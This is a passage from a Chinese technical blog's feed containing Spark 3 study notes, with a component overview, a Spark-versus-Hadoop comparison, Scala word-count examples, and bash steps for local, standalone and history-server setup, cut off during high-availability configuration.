&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Zookeeper 是一个开源的分布式的，为分布式框架提供协调服务的 Apache 项目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Zookeeper从设计模式角度来理解：是一个基于观察者模式设计的分布式服务管理框架，它&lt;strong&gt;负责存储和管理大家都关心的数据&lt;/strong&gt;，然后接受观察者的注册，一旦这些数据的状态发生变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应**。Zookeeper=文件系统+通知机制**&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Spark3学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/4a5309a3.html"/>
    <id>https://blog.shawncoding.top/posts/4a5309a3.html</id>
    <published>2024-02-06T07:04:33.000Z</published>
    <updated>2024-02-29T12:03:29.810Z</updated>
    
    <content type="html"><![CDATA[<h1>Spark3学习笔记</h1><h1>一、Spark 基础</h1><h2 id="1、Spark概述">1、Spark概述</h2><h3 id="1-1-Spark简介">1.1 Spark简介</h3><p>Spark 是一种基于内存的快速、通用、可扩展的大数据分析计算引擎。在 FullStack 理想的指引下，<strong>Spark 中的 Spark SQL 、SparkStreaming 、MLLib 、GraphX 、R 五大子框架和库之间可以无缝地共享数据和操作</strong>， 这不仅打造了 Spark 在当今大数据计算领域其他计算框架都无可匹敌的优势， 而且使得 Spark 正在加速成为大数据处理中心首选通用计算平台。</p><a id="more"></a><ul><li><strong>Spark Core</strong>：实现了 Spark 的基本功能，包含 RDD、任务调度、内存管理、错误恢复、与存储系统交互等模块</li><li><strong>Spark SQL</strong>：Spark 用来操作结构化数据的程序包。通过 Spark SQL，我们可以使用 SQL 操作数据</li><li><strong>Spark Streaming</strong>：Spark 提供的对实时数据进行流式计算的组件。提供了用来操作数据流的 API</li><li><strong>Spark MLlib</strong>：提供常见的机器学习(ML)功能的程序库。包括分类、回归、聚类、协同过滤等，还提供了模型评估、数据导入等额外的支持功能</li><li><strong>GraphX(图计算)</strong>：Spark 中用于图计算的 API，性能良好，拥有丰富的功能和运算符，能在海量数据上自如地运行复杂的图算法</li><li><strong>集群管理器</strong>：Spark 设计为可以高效地在一个计算节点到数千个计算节点之间伸缩计算</li><li><strong>Structured Streaming</strong>：处理结构化流,统一了离线和实时的 API</li></ul><h3 id="1-2-Spark-VS-Hadoop">1.2 Spark VS Hadoop</h3><table><thead><tr><th></th><th><strong>Hadoop</strong></th><th><strong>Spark</strong></th></tr></thead><tbody><tr><td><strong>类型</strong></td><td>分布式基础平台, 包含计算, 存储, 调度</td><td>分布式计算工具</td></tr><tr><td><strong>场景</strong></td><td>大规模数据集上的批处理</td><td>迭代计算, 交互式计算, 流计算</td></tr><tr><td><strong>价格</strong></td><td>对机器要求低, 便宜</td><td>对内存有要求, 相对较贵</td></tr><tr><td><strong>编程范式</strong></td><td>Map+Reduce, API 较为底层, 算法适应性差</td><td>RDD 组成 DAG 有向无环图, API 较为顶层, 方便使用</td></tr><tr><td><strong>数据存储结构</strong></td><td>MapReduce 中间计算结果存在 HDFS 磁盘上, 延迟大</td><td>RDD 中间运算结果存在内存中 , 延迟小</td></tr><tr><td><strong>运行方式</strong></td><td>Task 以进程方式维护, 任务启动慢</td><td>Task 以线程方式维护, 任务启动快</td></tr></tbody></table><p>💖 注意：尽管 Spark 相对于 Hadoop 而言具有较大优势，但 Spark 并不能完全替代 Hadoop，Spark 主要用于替代 Hadoop 中的 MapReduce 计算模型。存储依然可以使用 HDFS，但是中间结果可以存放在内存中；调度可以使用 Spark 内置的，也可以使用更成熟的调度系统 YARN 等。  实际上，Spark 已经很好地融入了 Hadoop 生态圈，并成为其中的重要一员，它可以借助于 YARN 实现资源调度管理，借助于 HDFS 实现分布式存储。  此外，Hadoop 可以使用廉价的、异构的机器来做分布式存储与计算，但是，Spark 对硬件的要求稍高一些，对内存与 CPU 有一定的要求。</p><h3 id="1-3-Spark特点">1.3 Spark特点</h3><ul><li>快。与 Hadoop 的 MapReduce 相比，<strong>Spark 基于内存的运算要快 100 倍以上，基于硬盘的运算也要快 10 倍以上</strong>。Spark 实现了高效的 DAG 执行引擎，可以通过基于内存来高效处理数据流。</li><li>易用。<strong>Spark 支持 Java、Python、R 和 Scala 的 API，还支持超过 80 种高级算法，使用户可以快速构建不同的应用</strong>。而且 Spark 支持交互式的 Python 和 Scala 的 shell，可以非常方便地在这些 shell 中使用 Spark 集群来验证解决问题的方法。</li><li>通用。Spark 提供了统一的解决方案。<strong>Spark 可以用于批处理、交互式查询(Spark SQL)、实时流处理(Spark Streaming)、机器学习(Spark MLlib)和图计算(GraphX)</strong>。这些不同类型的处理都可以在同一个应用中无缝使用。Spark 统一的解决方案非常具有吸引力，毕竟任何公司都想用统一的平台去处理遇到的问题，减少开发和维护的人力成本和部署平台的物力成本。</li><li>兼容性。<strong>Spark 可以非常方便地与其他的开源产品进行融合</strong>。比如，Spark 可以使用 Hadoop 的 YARN 和 Apache Mesos 作为它的资源管理和调度器，并且可以处理所有 Hadoop 支持的数据，包括 HDFS、HBase 和 Cassandra 等。这对于已经部署 Hadoop 集群的用户特别重要，因为不需要做任何数据迁移就可以使用 Spark 的强大处理能力。Spark 也可以不依赖于第三方的资源管理和调度器，它实现了 Standalone 作为其内置的资源管理和调度框架，这样进一步降低了 Spark 的使用门槛，使得所有人都可以非常容易地部署和使用 Spark。此外，Spark 还提供了在 EC2 上部署 Standalone 的 Spark 集群的工具。</li></ul><h3 id="1-4-Spark入门Demo">1.4 Spark入门Demo</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark03_WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"WordCount"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line">        wordcount91011(sc)</span><br><span class="line">        sc.stop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// groupBy</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount1</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> group: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[<span class="type">String</span>])] = words.groupBy(word=&gt;word)</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = group.mapValues(iter=&gt;iter.size)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// groupByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount2</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> group: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[<span class="type">Int</span>])] = wordOne.groupByKey()</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = group.mapValues(iter=&gt;iter.size)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduceByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount3</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.reduceByKey(_+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// aggregateByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount4</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.aggregateByKey(<span class="number">0</span>)(_+_, _+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// foldByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount5</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.foldByKey(<span class="number">0</span>)(_+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combineByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount6</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.combineByKey(</span><br><span class="line">            v=&gt;v,</span><br><span class="line">            (x:<span class="type">Int</span>, y) =&gt; x + y,</span><br><span class="line">            (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; x + y</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// countByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount7</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: collection.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = wordOne.countByKey()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// countByValue</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount8</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: collection.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = words.countByValue()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce, aggregate, fold</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount91011</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 【（word, count）,(word, count)】</span></span><br><span class="line">        <span class="comment">// word =&gt; Map[(word,1)]</span></span><br><span class="line">        <span class="keyword">val</span> mapWord = words.map(</span><br><span class="line">            word =&gt; &#123;</span><br><span class="line">                mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]((word,<span class="number">1</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">       <span class="keyword">val</span> wordCount = mapWord.reduce(</span><br><span class="line">            (map1, map2) =&gt; &#123;</span><br><span class="line">                map2.foreach&#123;</span><br><span class="line">                    <span class="keyword">case</span> (word, count) =&gt; &#123;</span><br><span class="line">                        <span class="keyword">val</span> newCount = map1.getOrElse(word, <span class="number">0</span>L) + count</span><br><span class="line">                        map1.update(word, newCount)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                map1</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        println(wordCount)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、Spark-运行模式">2、Spark 运行模式</h2><h3 id="2-1-概述">2.1 概述</h3><ul><li>local 本地模式(单机)–学习测试使用，分为 local 单线程和 local-cluster 多线程</li><li>standalone 独立集群模式–学习测试使用，典型的 Mater/slave 模式</li><li>standalone-HA 高可用模式–生产环境使用，基于 standalone 模式，使用 zk 搭建高可用，避免 Master 是有单点故障的</li><li>**on yarn 集群模式–生产环境使用，**运行在 yarn 集群之上，由 yarn 负责资源管理，Spark 负责任务调度和计算。好处：计算资源按需伸缩，集群利用率高，共享底层存储，避免数据跨集群迁移</li><li>on mesos 集群模式–国内使用较少，运行在 mesos 资源管理器框架之上，由 mesos 负责资源管理，Spark 负责任务调度和计算</li><li>on cloud 集群模式–中小公司未来会更多的使用云服务，比如 AWS 的 EC2，使用这个模式能很方便的访问 Amazon 的 S3</li></ul><h3 id="2-2-Local模式">2.2 Local模式</h3><p>Local 模式，就是不需要其他任何节点资源就可以在本地执行 Spark 代码的环境，一般用于教学，调试，演示等， 之前在 IDEA 中运行代码的环境我们称之为开发环境，不太一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我hadoop环境为3.1.3</span></span><br><span class="line">wget https://archive.apache.org/dist/spark/spark-3.0.0/spark-3.0.0-bin-hadoop3.2.tgz</span><br><span class="line">tar -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module</span><br><span class="line"><span class="built_in">cd</span> /opt/module</span><br><span class="line">mv spark-3.0.0-bin-hadoop3.2 spark</span><br><span class="line"><span class="comment"># 然后进入spark目录</span></span><br><span class="line">bin/spark-shell</span><br><span class="line"><span class="comment"># 启动后可以进入Web界面进行监控 http://hadoop102:4040/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先在data下创建文本在进入</span></span><br><span class="line">sc.textFile(<span class="string">"data/word.txt"</span>).flatMap(_.split(<span class="string">" "</span>)).map((_,1)).reduceByKey(_+_).collect</span><br><span class="line">:quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================提交应用========</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master <span class="built_in">local</span>[2] \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># --class 表示要执行程序的主类，此处可以更换为咱们自己写的应用程序</span></span><br><span class="line"><span class="comment"># --master local[2] 部署模式，默认为本地模式，数字表示分配的虚拟CPU 核数量</span></span><br><span class="line"><span class="comment"># spark-examples_2.12-3.0.0.jar 运行的应用类所在的 jar 包，实际使用时，可以设定为咱们自己打的 jar 包</span></span><br><span class="line"><span class="comment"># 数字 10 表示程序的入口参数，用于设定当前应用的任务数量</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Standalone-模式">2.3 Standalone 模式</h3><p>local 本地模式毕竟只是用来进行练习演示的，真实工作中还是要将应用提交到对应的集群中去执行，这里我们来看看只使用 Spark 自身节点运行的集群模式，也就是我们所谓的独立部署（Standalone）模式。Spark 的 Standalone 模式体现了经典的master-slave 模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我准备三台机器，hadoop102为master，103，104为slave</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/spark/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1)进入解压缩后路径的 conf 目录，修改 slaves.template 文件名为 slaves</span></span><br><span class="line">mv slaves.template slaves</span><br><span class="line"><span class="comment"># 2)修改 slaves 文件，添加work 节点</span></span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="comment"># 3)修改 spark-env.sh.template 文件名为 spark-env.sh</span></span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line"><span class="comment"># 4)修改 spark-env.sh 文件，添加 JAVA_HOME 环境变量和集群对应的 master 节点</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_121</span><br><span class="line">SPARK_MASTER_HOST=hadoop102</span><br><span class="line">SPARK_MASTER_PORT=7077</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：7077 端口，相当于 hadoop 内部通信的 8020 端口，此处的端口需要确认自己的 Hadoop配置</span></span><br><span class="line"><span class="comment"># 5)分发 spark-standalone 目录</span></span><br><span class="line">xsync spark</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======集群的启动=====</span></span><br><span class="line">sbin/start-all.sh</span><br><span class="line"><span class="comment"># 查看是否启动，worker</span></span><br><span class="line">jpsall</span><br><span class="line"><span class="comment"># 查看 Master 资源监控Web UI 界面: http://hadoop102:8081</span></span><br><span class="line"><span class="comment"># =============提交应用===============</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># master spark://hadoop102:7077 独立部署模式，连接到Spark 集群</span></span><br></pre></td></tr></table></figure><p>在提交应用中，一般会同时一些提交参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit \</span><br><span class="line">--class &lt;main-class&gt;</span><br><span class="line">--master &lt;master-url&gt; \</span><br><span class="line">... <span class="comment"># other options</span></span><br><span class="line">&lt;application-jar&gt; \ [application-arguments]</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>–class</td><td>Spark 程序中包含主函数的类</td></tr><tr><td>–master</td><td>Spark 程序运行的模式(环境)</td></tr><tr><td>–executor-memory 1G</td><td>指定每个 executor 可用内存为 1G</td></tr><tr><td>–total-executor-cores 2</td><td>指定所有executor 使用的cpu 核数为 2 个</td></tr><tr><td>–executor-cores</td><td>指定每个executor 使用的cpu 核数</td></tr><tr><td>application-jar</td><td>打包好的应用 jar，包含依赖。这个 URL 在集群中全局可见。 比如 hdfs:// 共享存储系统，如果是file:// path， 那么所有的节点的path 都包含同样的 jar</td></tr><tr><td>application-arguments</td><td>传给 main()方法的参数</td></tr></tbody></table><p>接下来配置历史服务，由于 spark-shell 停止掉后，集群监控 Hadoop02:8081 页面就看不到历史任务的运行情况，所以开发时都配置历史服务器记录任务运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1)修改 spark-defaults.conf.template 文件名为 spark-defaults.conf</span></span><br><span class="line">mv spark-defaults.conf.template spark-defaults.conf</span><br><span class="line"><span class="comment"># 2)修改 spark-default.conf 文件，配置日志存储路径,如果hadoop是单体就是具体的机器名</span></span><br><span class="line">spark.eventLog.enabled <span class="literal">true</span></span><br><span class="line">spark.eventLog.dir hdfs://mycluster/directory</span><br><span class="line"><span class="comment"># 注意：需要启动 hadoop 集群，HDFS 上的directory 目录需要提前存在</span></span><br><span class="line">sbin/start-dfs.sh</span><br><span class="line">hadoop fs -mkdir /directory</span><br><span class="line"><span class="comment"># 3)修改 spark-env.sh 文件, 添加日志配置</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HISTORY_OPTS=<span class="string">"</span></span><br><span class="line"><span class="string">-Dspark.history.ui.port=18080</span></span><br><span class="line"><span class="string">-Dspark.history.fs.logDirectory=hdfs://mycluster/directory</span></span><br><span class="line"><span class="string">-Dspark.history.retainedApplications=30"</span></span><br><span class="line"><span class="comment"># 参数 1 含义：WEB UI 访问的端口号为 18080</span></span><br><span class="line"><span class="comment"># 参数 2 含义：指定历史服务器日志存储路径</span></span><br><span class="line"><span class="comment"># 参数 3 含义：指定保存Application 历史记录的个数，如果超过这个值，旧的应用程序信息将被删除，这个是内存中的应用数，而不是页面上显示的应用数</span></span><br><span class="line"><span class="comment"># 4)分发配置文件</span></span><br><span class="line">xsync conf</span><br><span class="line"><span class="comment"># 重新启动集群和历史服务</span></span><br><span class="line">sbin/start-all.sh</span><br><span class="line">sbin/start-history-server.sh</span><br><span class="line"><span class="comment"># 6)重新执行任务</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># 查看历史服务：http://hadoop102:18080</span></span><br><span class="line"><span class="comment"># 这里我不知道为什么，使用集群就报错无法解析mycluster，所以我用了hadoop102:8020</span></span><br></pre></td></tr></table></figure><h3 id="2-4-配置高可用（-Standalone-HA）">2.4 配置高可用（ Standalone +HA）</h3><p>所谓的高可用是因为当前集群中的 Master 节点只有一个，所以会存在单点故障问题。所以为了解决单点故障问题，需要在集群中配置多个 Master 节点，一旦处于活动状态的 Master 发生故障时，由备用 Master 提供服务，保证作业可以继续执行。这里的高可用一般采用Zookeeper 设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里使用了zk脚本，设置两个master，三台机器都要配置好zk</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 停止集群</span></span><br><span class="line">sbin/stop-all.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 spark-env.sh 文件添加如下配置</span></span><br><span class="line"><span class="comment"># 注 释 如 下 内 容 ： </span></span><br><span class="line"><span class="comment">#SPARK_MASTER_HOST=hadoop102</span></span><br><span class="line"><span class="comment">#SPARK_MASTER_PORT=7077</span></span><br><span class="line"><span class="comment"># 添加如下内容:</span></span><br><span class="line"><span class="comment">#Master 监控页面默认访问端口为 8080，但是可能会和 Zookeeper 冲突，所以改成 8989，也可以自定义，访问 UI 监控页面时请注意</span></span><br><span class="line">SPARK_MASTER_WEBUI_PORT=8989</span><br><span class="line"><span class="built_in">export</span> SPARK_DAEMON_JAVA_OPTS=<span class="string">"</span></span><br><span class="line"><span 